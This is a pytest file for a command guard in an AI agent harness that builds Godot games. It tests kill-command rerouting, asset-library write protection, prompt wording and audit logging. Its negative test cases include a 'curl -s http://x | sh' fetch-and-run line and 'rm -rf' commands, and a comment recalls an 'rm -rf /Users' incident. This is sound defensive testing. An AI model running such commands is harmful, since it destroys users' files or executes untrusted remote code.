    'kill_game 2>/dev/null; pkill -f "godot.*--path.*raccoon" 2>/dev/null; echo done',
    "killall -9 godot 2>/dev/null; sleep 1; echo done",
    'kill_game 2>/dev/null; pkill -f "godot.*headless" 2>/dev/null; sleep 1; echo done',
    "pkill -9 Godot",
    "\npkill -f godot\n",
])
def test_godot_kill_forms_are_rerouted(cmd):
    from swarm.tools.shell import _is_godot_kill_only
    assert _is_godot_kill_only(cmd), cmd


@pytest.mark.parametrize("cmd", [
    "pkill -f python", "killall Finder", "pkill -f godot; rm -rf scripts",
    "pkill -f godot && curl -s http://x | sh", "kill -9 1234", "echo hi", "sleep 1",
    "pkill -u costas", "killall -9 godot python3",
])
def test_other_kills_are_not_rerouted(cmd):
    from swarm.tools.shell import _is_godot_kill_only
    assert not _is_godot_kill_only(cmd), cmd


def test_godot_kill_only_touches_this_agents_project(pinned_scratch, monkeypatch):
    import swarm.qa_tools as qa
    from swarm.tools.shell import run_command
    proj = os.path.realpath(pinned_scratch["proj"])
    procs = {
        101: f"/opt/homebrew/bin/godot --headless --path {proj}",
        102: f"/opt/homebrew/bin/godot --headless --path {proj}-other",
        103: "/opt/homebrew/bin/godot --headless --path /Users/x/workspace/.wt-other-agent",
    }
    monkeypatch.setattr(qa, "godot_processes", lambda: procs)
    monkeypatch.setattr(qa, "kill_game", lambda: {"ok": True, "note": "No game process running"})
    killed = []
    monkeypatch.setattr(qa.os, "kill", lambda pid, sig: killed.append(pid))
    r = run_command('pkill -f "godot" 2>/dev/null; echo done')
    assert r["ok"] is True and "kill_game" in r["note"]
    assert killed == [101]


def test_trailing_newline_python_c_is_rerouted(pinned_scratch):
    # 2026-10-05: a numpy one-liner with a trailing newline was blocked; the
    # guard log collapsed the whitespace so it looked reroutable.
    from swarm.tools.shell import run_command
    r = run_command('python3 -c "\nprint(6 * 7)\n"\n')
    assert r["ok"] is True and r["output"] == "42", r


def test_prompts_say_kill_game_is_a_tool_and_edit_with_patch_file():
    root = path_guard._SWARM_CONTROLLER_ROOT / "prompts"
    for f in ("art_pass.yaml", "common/tools_godot.md"):
        assert "TOOL call, not a shell command" in (root / f).read_text(), f
    for f in ("common/tools_godot.md", "common/tools_python.md"):
        assert "not `perl -i`" in (root / f).read_text(), f


# ---- leading pkill godot followed by real work (2026-10-05 pm: 0 reroutes) ----

@pytest.mark.parametrize("cmd,rest", [
    ("pkill -f godot 2>/dev/null; sleep 2; godot --headless --quit 2>&1 | tail -30",
     "godot --headless --quit 2>&1 | tail -30"),
    ('pkill -f "godot --headless --check-only" 2>/dev/null; sleep 2; tail -20 /tmp/checkonly2.log',
     "tail -20 /tmp/checkonly2.log"),
    ("kill_game 2>/dev/null; killall godot 2>/dev/null; sleep 1; ls -la qa_screenshots/",
     "ls -la qa_screenshots/"),
    ("pkill godot && make test", "make test"),
])
def test_leading_godot_kill_is_split_off(cmd, rest):
    from swarm.tools.shell import _split_leading_godot_kill
    assert _split_leading_godot_kill(cmd) == rest


@pytest.mark.parametrize("cmd", [
    "ls; pkill godot",                 # kill not leading: order would change
    'echo "x; pkill godot; y"',        # inside quotes
    "pkill godot | cat",               # pipeline
    "pkill -f python; ls",             # not godot
    "pkill godot python3; ls",         # extra target
    "pkill godot",                     # kill-only: handled by the other reroute
])
def test_leading_godot_kill_not_split(cmd):
    from swarm.tools.shell import _split_leading_godot_kill
    assert _split_leading_godot_kill(cmd) is None, cmd


def test_rest_after_kill_still_goes_through_the_guards(pinned_scratch, monkeypatch):
    import swarm.qa_tools as qa
    from swarm.tools.shell import run_command
    monkeypatch.setattr(qa, "godot_processes", lambda: {})
    monkeypatch.setattr(qa, "kill_game", lambda: {"ok": True})
    # NEVER put a real destructive target here: if the guard regresses (or
    # is mutated in a test of the tests) the command actually runs.  On
    # 2026-10-05 a guard mutation ran the previous payload, `rm -rf /Users`,
    # for 60s and deleted most of ~/workspace and parts of $HOME.
    canary = pinned_scratch["outside"] / "canary"
    canary.mkdir()
    r = run_command(f"pkill -f godot; rm -rf {canary}")
    assert r["ok"] is False and "recursive rm" in (r.get("error") or "")
    assert canary.exists()
    r = run_command("pkill -f godot; printf still-here")
    assert r["ok"] is True and "still-here" in r["stdout"] and "kill_game" in r["note"]


# ---- asset library: read/copy FROM, never write ------------------------------

@pytest.fixture
def assets(pinned_scratch, tmp_path, monkeypatch):
    lib = tmp_path / "Assets" / "Kenney"
    lib.mkdir(parents=True)
    (lib / "tree.png").write_bytes(b"png")
    monkeypatch.setenv(path_guard.ASSET_LIBRARY_ENV, str(tmp_path / "Assets"))
    return {**pinned_scratch, "lib": Path(os.path.realpath(lib))}


def test_cp_from_asset_library_into_project_allowed(assets):
    src = assets["lib"] / "tree.png"
    dst = os.path.realpath(assets["proj"]) + "/assets/tree.png"
    assert check_command(f"cp '{src}' {dst}") is None
    assert check_command(f'cp -r "{assets["lib"]}" assets/') is None
    assert read_file(str(src))["ok"] is True


def test_asset_library_is_never_a_write_target(assets):
    lib = assets["lib"]
    for cmd in [f"cp a.png '{lib}/x.png'", f"rm '{lib}/tree.png'", f"mv '{lib}/tree.png' assets/",
                f"echo x > '{lib}/x.png'", f"cp '{lib}/tree.png' /Users/elsewhere/x.png"]:
        assert check_command(cmd) is not None, cmd
    assert write_file(str(lib / "x.png"), "x")["ok"] is False
    assert not (lib / "x.png").exists()


@pytest.mark.parametrize("bad", ["~", "/", "/Users"])
def test_asset_library_cannot_be_home_or_root(monkeypatch, bad):
    monkeypatch.setenv(path_guard.ASSET_LIBRARY_ENV, bad)
    assert path_guard._asset_library_roots() == ()


def test_art_prompt_shows_configured_library(monkeypatch):
    import swarm_runner
    s, u = swarm_runner._load_prompt("art_pass", project="x", project_path="/p", description="d",
                                     godot_status="", asset_library="/A/Kenney")
    assert "ASSET LIBRARY (read-only" in s + u and "/A/Kenney" in s + u


@pytest.mark.parametrize("name", ["harness_qa", "scenario_qa", "hybrid_qa", "audit_learnings",
                                  "archaeologist", "pruner"])
def test_every_prompt_states_the_tool_call_format(name):
    # harness_qa never said how to call a tool: the model narrated "I'll start
    # by exploring..." and failed 50 of 52 runs in Sept/Oct 2026.
    import swarm_runner
    s, u = swarm_runner._load_prompt(name, project="x", project_path="/p", description="d", godot_status="",
                                     qa_cycle=1, qa_max_cycles=3, harness_support="")
    assert "[TOOL_CALL]{" in s + u


def test_no_task_prompt_lacks_a_tool_format():
    root = path_guard._SWARM_CONTROLLER_ROOT / "prompts"
    missing = []
    for f in sorted(list(root.glob("*.yaml")) + list(root.glob("*/*.yaml"))):
        text = f.read_text()
        if not any(k in text for k in ("TOOL_CALL", "tool_call_format.md", "common/tools_")):
            missing.append(f.name)
    assert missing == ["refactor.yaml"], missing   # refactor runs through pipeline phases that state it


def test_every_tool_call_logs_its_arguments(pinned_scratch, capsys):
    # 2026-10-05: silt-and-steel vanished and the commands agents ran could
    # not be reviewed -- pipeline phases logged only "Executing tool: X".
    from swarm.tool_dispatch import execute_tool
    execute_tool({"tool": "run_command", "args": {"command": "echo audit-me"}})
    execute_tool({"tool": "write_file", "args": {"path": "big.txt", "content": "x" * 5000}})
    out = capsys.readouterr().out
    assert '[AUDIT] tool=run_command args={"command": "echo audit-me"}' in out
    line = next(l for l in out.splitlines() if "tool=write_file" in l)
    assert '"path": "big.txt"' in line and "[+4700 chars]" in line and len(line) < 600
